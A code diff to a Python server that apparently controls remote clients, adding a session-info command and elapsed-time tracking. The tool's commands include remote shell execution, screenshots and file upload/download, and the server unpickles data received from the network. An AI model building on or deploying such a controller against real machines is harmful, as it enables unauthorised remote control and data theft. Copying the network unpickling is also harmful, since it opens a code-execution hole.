@@ -10,7 +10,7 @@ from getpass import getuser
 from pickle import loads, dumps
 from datetime import datetime
 from pathlib import Path
-from time import sleep
+from time import sleep, time
 from rich.progress import BarColumn, Progress, TimeRemainingColumn
 from rich import print as printr
 from os import system, uname
@@ -29,6 +29,22 @@ class Server(object):
     # getting the current user who you are attached
     def getCurrentUser(self):
         return self.connectedUsers[self.userAttached]
+
+    # basic information of session you are
+    def sessionInfo(self, args=''):
+        if self.userAttached:
+            userInfo = self.getCurrentUser()
+            hour, minute, second = self.calculateElapsedTime(time()-userInfo["initialTime"]) # elapsed session time
+            data = [
+                f'Name Session: [green]{self.userAttached}',
+                f'[white]Current Directory: [green]"{userInfo["currentDirectory"]}',
+                f'[white]Elapsed session Time: [green]{hour}:{minute}:{int(second)} [white]seconds'
+            ]
+
+            for info in data:
+                printr(info)
+        else:
+            printr(f'[red] No session currently attached.')
 
     # basic information from attached user
     def userInfo(self, args=''):
@@ -152,16 +168,24 @@ class Server(object):
         else:
             printr('[yellow] No session currently attached.')
 
-    # calculating time response of some command  | params: ti= start time, tf= final time 
-    def elapsedTime(self, ti, tf):
-        return f'{int(tf[0])-int(ti[0])}.{int(tf[1])-int(ti[1])}'
+    # calculating time response of some command  | param: seconds of the period
+    def calculateElapsedTime(self, seconds):
+        seconds = seconds % (24 * 86400)
+        day = seconds // 86400
+        seconds = seconds - (day * 86400)
+        hour = seconds // 3600
+        seconds = seconds - (hour * 3600)
+        minutes = seconds // 60
+        seconds = seconds - (minutes * 60)
+
+        return int(hour), int(minutes), seconds
 
     # adding the user to a session 
     def addUser(self, data):
         self.connectedUsers.update({data['name']: data})
     
     # removing the user from a session 
-    def removeUser(self, name):
+    def removeUserSession(self, name):
         if name:
             if self.connectedUsers.get(name):
                 if self.userAttached:
@@ -218,8 +242,9 @@ class Server(object):
             "/attach": {"local": True, "action": self.attach},
             "/detach": {"local": True, "action": self.detach},
             "/sessions": {"local": True, "action": self.showSessions},
+            "/sessioninfo": {"local": True, "action": self.sessionInfo},
             "/userinfo": {"local": True, "action": self.userInfo},
-            "/rmsession": {"local": True, "action": self.removeUser},
+            "/rmsession": {"local": True, "action": self.removeUserSession},
             "/screenshot": {"local": False, "action": self.screenshot},
             "/download": {"local": False, "action": self.download},
             "/upload": {"local": False, "action": self.upload},
@@ -240,7 +265,7 @@ class Server(object):
             # 0: function, 1: args | example: /attach znairy = self.attach, 'znairy'
             return self.allCommands()[command.split()[0]]["action"], ''.join(f'{cmd} ' for cmd in command.split()[1:])
 
-        return False # command does not exist
+        return False, '' # command does not exist
 
     # checking the possible commands (strings that starts with "/")
     def runCommand(self, command):
@@ -259,7 +284,9 @@ class Server(object):
             received += connection.recv(header['bytes'])
 
         print(received.decode())
-        printr(f'returned in {self.elapsedTime(header["time"], datetime.now().strftime("%M %S").split())} seconds.') # time response of command
+
+        h, m, s = self.calculateElapsedTime(time() - header["initialTime"]);del(h,m)
+        printr(f'returned in {s:.1f} seconds.') # time response of command
 
     # send command to be execute in shell of client side
     def sendCommand(self, command):
@@ -306,7 +333,7 @@ class Server(object):
         while True:
             connection, address = self.__Server.accept();del(address)
             response = loads(connection.recv(1024))
-            response.update({"conn": connection})
+            response.update({"conn": connection, "initialTime": time()})
             self.addUser(response)
             printr(f'\n[*] Incoming connection from [green]{response["name"]}:{response["SO"]}')
             printr(f'[green]{getuser()}'+ '[white]@' + f'[green]sonaris[white]#:{self.userCwd}# ', end='')
